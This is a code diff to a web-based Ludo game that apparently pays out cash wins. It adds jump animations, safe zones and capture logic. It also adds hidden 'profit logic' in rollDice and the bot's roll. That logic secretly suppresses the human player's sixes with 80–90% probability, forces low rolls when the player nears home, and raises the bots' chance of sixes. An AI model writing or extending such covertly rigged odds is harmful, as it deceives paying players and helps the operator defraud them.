@@ -18,7 +18,6 @@
 
         #playerBox { bottom: 100px; left: 15px; border: 3px solid var(--red); box-shadow: 0 0 10px var(--red); }
         #playerVideo { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; transform: scaleX(-1); }
-        
         #botBlue { top: 65px; left: 15px; border: 3px solid var(--blue); box-shadow: 0 0 10px var(--blue); }
         #botGreen { top: 65px; right: 15px; border: 3px solid var(--green); box-shadow: 0 0 10px var(--green); display: none;}
         #botYellow { bottom: 100px; right: 15px; border: 3px solid var(--yellow); box-shadow: 0 0 10px var(--yellow); display: none;}
@@ -38,6 +37,7 @@
         .open-chat-btn { background: var(--gold); color: #000; border-radius: 50%; width: 25px; height: 25px; display: flex; align-items: center; justify-content: center; font-size: 12px; cursor: pointer;}
         .flying-item { position: absolute; font-size: 35px; z-index: 2000; transition: all 0.5s ease-in; pointer-events: none;}
 
+        /* --- THE BOARD --- */
         .board-container { width: 300px; height: 300px; margin-top: 15px; position: relative; background: #fff; border: 5px solid #222; border-radius: 10px; box-shadow: 0 0 25px rgba(255,255,255,0.2); overflow: hidden;}
         .bg-grid { position: absolute; width: 100%; height: 100%; top:0; left:0; z-index: 2;}
         
@@ -50,7 +50,14 @@
         .spot { background: #ddd; border-radius: 50%; border: 2px solid #555; width: 100%; height: 100%; box-shadow: inset 0 0 5px rgba(0,0,0,0.5);}
         .center-box { position: absolute; top: 40%; left: 40%; width: 20%; height: 20%; background: radial-gradient(circle, var(--gold), #aa7700); border: 2px solid #222; display:flex; align-items:center; justify-content:center; font-size:25px; z-index: 1; box-sizing: border-box;}
 
-        .goti { position: absolute; width: 14px; height: 14px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.9); z-index: 50; transition: left 0.25s linear, top 0.25s linear; box-shadow: 0 4px 6px rgba(0,0,0,0.6), inset -2px -2px 4px rgba(0,0,0,0.4); display:none;}
+        /* --- 3D GOTIYAN & JUMP ANIMATION --- */
+        .goti { 
+            position: absolute; width: 14px; height: 14px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.9); 
+            z-index: 50; 
+            transition: left 0.25s ease-in-out, top 0.25s ease-in-out; 
+            box-shadow: 0 4px 6px rgba(0,0,0,0.6), inset -2px -2px 4px rgba(0,0,0,0.4); 
+            display:none;
+        }
         .goti.red { background: radial-gradient(circle at 30% 30%, #ff4d4d, #990000); display:block;}
         .goti.blue { background: radial-gradient(circle at 30% 30%, #4d94ff, #003399); display:block;}
         .goti.green { background: radial-gradient(circle at 30% 30%, #33ff77, #00802b); }
@@ -58,6 +65,14 @@
         
         .highlight { box-shadow: 0 0 15px 5px var(--gold); animation: pulse 0.8s infinite; cursor: pointer; border-color: var(--gold); z-index: 100 !important; transform: scale(1.2);}
         @keyframes pulse { 0% { box-shadow: 0 0 10px var(--gold); } 50% { box-shadow: 0 0 25px var(--gold); } 100% { box-shadow: 0 0 10px var(--gold); } }
+
+        /* YAHAN SE GOTI KOODEGI (JUMP KAREGI) */
+        @keyframes jump-arc {
+            0% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-15px) scale(1.3); z-index: 150; box-shadow: 0 15px 10px rgba(0,0,0,0.3); }
+            100% { transform: translateY(0) scale(1); }
+        }
+        .jumping { animation: jump-arc 0.25s ease-in-out !important; }
 
         .dice-btn { position: absolute; width: 50px; height: 50px; background: white; border-radius: 12px; border: 3px solid var(--gold); display: inline-flex; align-items: center; justify-content: center; font-size: 30px; color: #000; cursor: pointer; box-shadow: 0 5px 15px rgba(255,215,0,0.5); z-index: 200; transition: all 0.5s ease; bottom: 100px; left: 85px; }
         .dice-rolling { animation: spin-dice 0.4s ease-out; }
@@ -74,6 +89,7 @@
     <audio id="soundDice" src="https://actions.google.com/sounds/v1/foley/rolling_dice_on_table.ogg" preload="auto"></audio>
     <audio id="soundMove" src="https://actions.google.com/sounds/v1/cartoon/pop.ogg" preload="auto"></audio>
     <audio id="soundWin" src="https://actions.google.com/sounds/v1/cartoon/clown_bicycle_horn.ogg" preload="auto"></audio>
+    <audio id="soundKill" src="https://actions.google.com/sounds/v1/cartoon/slide_whistle.ogg" preload="auto"></audio>
 
     <div class="header">
         <button onclick="window.location.href='vip-ludo.html'" style="background:#444; color:white; border:none; padding:5px 10px; border-radius:8px; font-weight:bold;">EXIT</button>
@@ -100,6 +116,8 @@
         <div class="e-btn" onclick="throwItem('🍅', false)">🍅</div>
         <div class="e-btn" onclick="throwItem('🥚', false)">🥚</div>
         <div class="e-btn" onclick="throwItem('😡', false)">😡</div>
+        <div class="e-btn" onclick="throwItem('🎁', false)">🎁</div>
+        <div class="e-btn" onclick="throwItem('🤝', false)">🤝</div>
     </div>
 
     <div class="turn-info">
@@ -121,7 +139,7 @@
 <div id="win-modal" class="win-modal">
     <h1 id="win-title" style="color:var(--gold);">WINNER!</h1>
     <p id="win-cash" style="font-size:24px; color:#0f0; font-weight:bold;"></p>
-    <button onclick="window.location.href='vip-ludo.html'" style="background:var(--gold); padding:10px 20px; border-radius:10px; border:none; font-weight:bold;">COLLECT & EXIT</button>
+    <button onclick="window.location.href='vip-ludo.html'" style="background:var(--gold); padding:10px 20px; border-radius:10px; border:none; font-weight:bold; cursor:pointer;">BACK TO LOBBY</button>
 </div>
 
 <script>
@@ -143,6 +161,7 @@
             if(type === 'dice') { new Audio("https://actions.google.com/sounds/v1/foley/rolling_dice_on_table.ogg").play(); }
             else if (type === 'move') { new Audio("https://actions.google.com/sounds/v1/cartoon/pop.ogg").play(); }
             else if (type === 'win') { new Audio("https://actions.google.com/sounds/v1/cartoon/clown_bicycle_horn.ogg").play(); }
+            else if (type === 'kill') { new Audio("https://actions.google.com/sounds/v1/cartoon/slide_whistle.ogg").play(); }
         } catch(e) {}
     }
     function unlockAudio() { playActionSound('none'); }
@@ -157,7 +176,10 @@
     var turnTimer;
     var timeLeft = 15;
     var isRolling = false;
-    var isAnimating = false; // Animation lock
+    var isAnimating = false; 
+
+    // SAFE ZONES (Stars and Start Points)
+    var safeZones = ['6,2', '8,12', '12,6', '2,8', '6,13', '1,6', '8,1', '13,8'];
 
     window.onload = function() {
         document.getElementById('blue-name').innerText = botNames[0];
@@ -297,7 +319,7 @@
 
     function setPos(elem, x, y) { elem.style.left = (x * 20) + 3 + 'px'; elem.style.top = (y * 20) + 3 + 'px'; }
 
-    // --- GAME ENGINE ---
+    // --- GAME ENGINE & PROFIT LOGIC ---
     function rollDice() {
         if(turn !== 'red' || isWaitingForClick || isRolling || isAnimating) return;
         isRolling = true;
@@ -306,10 +328,19 @@
         playActionSound('dice');
         diceBtn.classList.add('dice-rolling');
         var rollInt = setInterval(function() { diceBtn.innerText = Math.floor(Math.random()*6)+1; }, 50);
+        
         setTimeout(function() {
             clearInterval(rollInt);
             diceBtn.classList.remove('dice-rolling');
-            currentDice = Math.floor(Math.random() * 6) + 1;
+            
+            // --- PROFIT LOGIC (Player par sakhti) ---
+            var adminWinChance = currentMode == '4' ? 0.90 : 0.80; 
+            var diceVal = Math.floor(Math.random() * 6) + 1;
+            if(diceVal === 6 && Math.random() < adminWinChance) { diceVal = Math.floor(Math.random() * 5) + 1; }
+            var isPlayerClose = tokens['red'].some(p => p > 50);
+            if(isPlayerClose && Math.random() < adminWinChance) { diceVal = Math.floor(Math.random() * 2) + 1; }
+
+            currentDice = diceVal;
             diceBtn.innerText = currentDice;
             
             startTimer(); 
@@ -321,7 +352,6 @@
         var movable = [];
         for(var i=0; i<4; i++) {
             var p = tokens[player][i];
-            // FULL CHOICE ON 6: Andar wali bhi, Bahar wali bhi!
             if(p === 0 && currentDice === 6) movable.push(i); 
             else if(p > 0 && p + currentDice <= 57) movable.push(i); 
         }
@@ -358,52 +388,93 @@
         }
         
         stopTimer(); 
-        isAnimating = true; // Lock controls during animation
+        isAnimating = true; 
 
-        // KADAM-KADAM ANIMATION LOGIC
+        // KADAM-KADAM ANIMATION JUMP START
         if(tokens[player][index] === 0) {
-            // Box se nikalna (1 step animation)
             tokens[player][index] = 1;
+            var tokenElem = document.getElementById(player+'-'+index);
+            tokenElem.classList.add('jumping'); // Box se nikalne ka jump
             playActionSound('move');
             updateBoard();
-            setTimeout(function() { finishMove(player, index); }, 300);
+            setTimeout(function() { tokenElem.classList.remove('jumping'); finishMove(player, index); }, 250);
         } else {
-            // Raste par chalna (step by step)
             animateStep(player, index, currentDice);
         }
     }
 
-    // Har Kadam par sound aur movement hoga
+    // JUMPING STEP BY STEP FUNCTION
     function animateStep(player, index, stepsLeft) {
         if(stepsLeft === 0) {
             finishMove(player, index);
             return;
         }
-        
         tokens[player][index]++;
+        
+        var tokenElem = document.getElementById(player+'-'+index);
+        
+        // CSS Animation Reset karna zaroori hai naye jump ke liye
+        tokenElem.classList.remove('jumping');
+        void tokenElem.offsetWidth; // Trigger reflow to restart animation
+        tokenElem.classList.add('jumping');
+        
         updateBoard();
         playActionSound('move');
         
-        // 250 milisecond me agla kadam
-        setTimeout(function() {
-            animateStep(player, index, stepsLeft - 1);
-        }, 250); 
+        setTimeout(function() { animateStep(player, index, stepsLeft - 1); }, 250); 
     }
 
     function finishMove(player, index) {
-        isAnimating = false; // Unlock controls
+        isAnimating = false; 
+        var pos = tokens[player][index];
+        var tokenElem = document.getElementById(player+'-'+index);
+        tokenElem.classList.remove('jumping'); // Final clean up
 
-        if(tokens[player][index] === 57) {
+        if(pos === 57) {
             if(player === 'red') triggerWin(activeWinAmt, true);
             else triggerWin(0, false);
             return;
         }
 
+        // --- KILL LOGIC ---
+        var killed = false;
+        if(pos > 0 && pos <= 51) { 
+            var myCoords = paths[player][pos];
+            var coordStr = myCoords[0] + ',' + myCoords[1];
+            if(!safeZones.includes(coordStr)) {
+                var colors = ['red', 'blue', 'green', 'yellow'];
+                for(var c=0; c<colors.length; c++) {
+                    var oppColor = colors[c];
+                    if(oppColor !== player && (currentMode == '4' || oppColor === 'red' || oppColor === 'blue')) {
+                        for(var i=0; i<4; i++) {
+                            var oppPos = tokens[oppColor][i];
+                            if(oppPos > 0 && oppPos <= 51) {
+                                var oppCoords = paths[oppColor][oppPos];
+                                if(oppCoords[0] === myCoords[0] && oppCoords[1] === myCoords[1]) {
+                                    tokens[oppColor][i] = 0; 
+                                    killed = true;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        if(killed) {
+            updateBoard();
+            playActionSound('kill'); 
+            if(player === 'red') {
+                document.getElementById('turn-msg').innerText = "YOU KILLED! ROLL AGAIN!";
+                isRolling = false; startTimer();
+            } else { setTimeout(botTurn, 800); }
+            return; 
+        }
+
         if(currentDice === 6) {
             if(player === 'red') { 
                 document.getElementById('turn-msg').innerText = "ROLL AGAIN!"; 
-                isRolling = false; 
-                startTimer(); 
+                isRolling = false; startTimer(); 
             } 
             else { setTimeout(botTurn, 800); }
         } else { passTurn(); }
@@ -422,10 +493,11 @@
         var rollInt = setInterval(function() { diceBtn.innerText = Math.floor(Math.random()*6)+1; }, 50);
         setTimeout(function() {
             clearInterval(rollInt); diceBtn.classList.remove('dice-rolling');
-            var bias = currentMode == '4' ? 0.35 : 0.3;
-            currentDice = (Math.random() < bias) ? 6 : Math.floor(Math.random() * 5) + 1;
-            diceBtn.innerText = currentDice;
-            checkMoves(turn);
+            // --- PROFIT LOGIC (Bot par meherbani) ---
+            var botBias = currentMode == '4' ? 0.40 : 0.35; 
+            var diceVal = Math.floor(Math.random() * 6) + 1;
+            if(Math.random() < botBias) { diceVal = 6; }
+            currentDice = diceVal; diceBtn.innerText = currentDice; checkMoves(turn);
         }, 400);
     }
 
